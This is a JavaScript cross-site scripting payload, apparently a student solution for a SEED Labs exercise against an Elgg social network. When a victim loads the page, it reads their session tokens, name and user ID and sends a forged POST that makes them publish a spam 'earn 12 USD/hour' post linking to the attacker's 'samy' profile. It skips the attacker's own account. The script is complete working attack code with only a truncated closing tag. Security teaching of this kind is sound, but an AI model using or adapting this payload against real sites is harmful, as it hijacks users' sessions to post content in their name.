
<script type="text/javascript">
	window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="__elgg_token="+elgg.security.token.__elgg_token;
	var name = elgg.session.user.name;
	var guid = elgg.session.user.guid;
	//Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/thewire/add"; //FILL IN
	var content = token+ts+"&body=To%20earn%2012%20USD%2Fhour%28%21%29%20%2C%20visit%20now%20http%3A%2F%2Fwww.seed-server.com%2Fprofile%2Fsamy"; //FILL IN
	
	if(guid != 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
	}
	}
</script